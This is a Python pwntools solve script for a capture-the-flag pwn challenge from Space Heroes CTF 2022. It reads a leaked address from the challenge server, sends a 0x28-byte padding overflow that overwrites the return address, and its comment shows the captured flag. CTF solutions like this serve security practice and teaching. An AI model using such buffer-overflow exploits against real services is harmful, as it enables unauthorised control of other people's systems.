from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

HOST = "0.cloud.chals.io"
PORT = 30096
s = remote(HOST, PORT)

s.recvuntil("resides at: 0x")
leak_addr = int(s.recvuntil("\n"), 16)

print "leak_addr =", hex(leak_addr)

s.recvuntil("Jedi Mind tricks dont work on me >>>")
s.sendline("A"*0x28+p64(leak_addr))

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Warmup_to_the_Dark_Side$ python solve.py 
[+] Opening connection to 0.cloud.chals.io on port 30096: Done
leak_addr = 0x560fdfd6120c
[*] Switching to interactive mode
 
shctf{I_will_remov3_th3s3_restraints_and_leave_the_c3ll}
[*] Got EOF while reading in interactive
'''
